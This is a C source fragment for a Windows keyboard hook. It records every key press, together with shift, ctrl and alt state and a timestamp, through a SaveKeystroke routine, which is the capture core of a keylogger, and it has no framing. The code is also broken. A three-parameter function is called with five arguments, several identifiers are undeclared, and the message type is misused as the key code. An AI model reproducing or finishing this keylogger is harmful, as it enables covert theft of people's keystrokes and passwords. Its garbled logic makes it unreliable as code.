// Function prototypes
void HandleKeyPress(unsigned char key, int state);
void SaveKeystroke(char key, char modifier, int time);

// Callback function for keyboard events
static LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    switch (wParam) {
        case WM_KEYDOWN:
        case WM_KEYUP:
            HandleKeyPress((unsigned char)wParam, wParam);
            break;
        default:
            break;
    }
    return 0;
}

// Function to handle key presses
void HandleKeyPress(unsigned char key, int state) {
    static int lastKey = 0;
    if (state != lastKey) {
        lastKey = state;
        if (state != 0) {
            char c = key;
            if (GetAsyncKeyState(WHITESPACE) & 0x1) {
                // Spacebar was pressed
                c = ' ';
            }
            // Check for modifier keys
            if (state & 0x20) { // Shift
                shiftPressed = 1;
            } else {
                shiftPressed = 0;
            }
            if (state & 0x10) { // Ctrl
                ctrlPressed = 1;
            } else {
                ctrlPressed = 0;
            }
            if (state & 0x40) { // Alt
                altPressed = 1;
            } else {
                altPressed = 0;
            }
            // Check if it's a printable character
            if (key != 0 && (state != 0)) {
                SaveKeystroke(c, shiftPressed, ctrlPressed, altPressed, time(NULL));
            }
        }
    }
}

